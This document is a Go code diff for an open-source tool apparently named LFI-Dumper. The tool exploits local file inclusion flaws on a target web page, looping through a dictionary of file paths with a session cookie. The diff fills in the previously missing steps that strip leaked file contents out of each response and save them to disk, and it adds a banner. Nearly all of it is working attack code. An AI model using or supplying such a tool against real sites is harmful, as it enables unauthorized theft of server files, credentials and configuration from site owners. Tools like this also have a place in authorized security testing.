@@ -4,10 +4,12 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"net/http/cookiejar"
 	"os"
+	"path"
 	"strings"
 )
 
@@ -30,6 +32,19 @@ func clean_dictionary_entry(entry string) string {
 	return s
 }
 
+func print_AsciiArt() {
+	fmt.Println()
+	fmt.Println(" ▄▄▌  ·▄▄▄▪    ·▄▄▄▄  ▄• ▄▌• ▌ ▄ ·.  ▄▄▄·▄▄▄ .▄▄▄")
+	fmt.Println(" ██•  ▐▄▄ ██   ██· ██ █▪██▌·██ ▐███▪▐█ ▄█▀▄.▀·▀▄ █·")
+	fmt.Println(" ██ ▪ █  ▪▐█·  ▐█▪ ▐█▌█▌▐█▌▐█ ▌▐▌▐█· ██▀·▐▀▀▪▄▐▀▀▄ ")
+	fmt.Println(" ▐█▌ ▄██ .▐█▌  ██. ██ ▐█▄█▌██ ██▌▐█▌▐█▪·•▐█▄▄▌▐█•█▌")
+	fmt.Println(" .▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀▀▀•  ▀▀▀ ▀▀  █▪▀▀▀.▀    ▀▀▀ .▀  ▀")
+	fmt.Println()
+	fmt.Println("     https://github.com/Asiern/LFI-Dumper")
+	fmt.Println()
+
+}
+
 func getFile(endpoint string, file string, outputpath string) {
 
 	// Generate url by joining endpoint & file
@@ -48,9 +63,9 @@ func getFile(endpoint string, file string, outputpath string) {
 		log.Fatalf(err.Error())
 	}
 	req.AddCookie(cookie)
-	for _, c := range req.Cookies() {
-		fmt.Println(c)
-	}
+	// for _, c := range req.Cookies() {
+	// 	fmt.Println(c)
+	// }
 
 	// Send request
 	response, err := client.Do(req)
@@ -60,13 +75,39 @@ func getFile(endpoint string, file string, outputpath string) {
 	defer response.Body.Close()
 	fmt.Println(response.StatusCode)
 
-	// if response.Status != "200" {
-	// 	return
-	// }
+	// Get local file contents from response body
+	body, err := ioutil.ReadAll(response.Body)
+	content := string(body)
+	pos := strings.Index(content, "<!DOCTYPE")
+	if pos == -1 {
+		return
+	}
+	content = content[:pos]
+	if len(content) < 3 {
+		return
+	}
+	fmt.Println(len(content))
 
-	// TODO Get local file contents from response body
+	// Create output dir
+	_, err = os.Stat(outputpath)
+	if os.IsNotExist(err) {
+		err = os.MkdirAll(outputpath, os.ModeDir)
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+	}
 
-	// TODO Save contents to file
+	// Save contents to file
+	outputfilepath := path.Join(outputpath, path.Base(file))
+	fmt.Println(outputfilepath)
+	outputfile, err := os.Create(outputfilepath)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(-1)
+	}
+	outputfile.WriteString(content)
+	outputfile.Close()
 
 }
 
@@ -85,6 +126,7 @@ func main() {
 			case "d":
 				dictionaryPath = os.Args[i+2]
 			case "h": // Help menu
+				print_AsciiArt()
 				fmt.Println()
 				fmt.Println("Usage: ./lfidumper -e 'http://target.com/page=' -d dictionary.txt")
 				fmt.Println()
@@ -101,6 +143,7 @@ func main() {
 			}
 		}
 	}
+	print_AsciiArt()
 
 	if endpoint == "" {
 		fmt.Println("No target url specified. Specify target './lfidumper -u http://target/.git -d dictionary.txt'")
@@ -136,5 +179,4 @@ func main() {
 		// Get file contents
 		getFile(endpoint, line, outdir)
 	}
-
 }
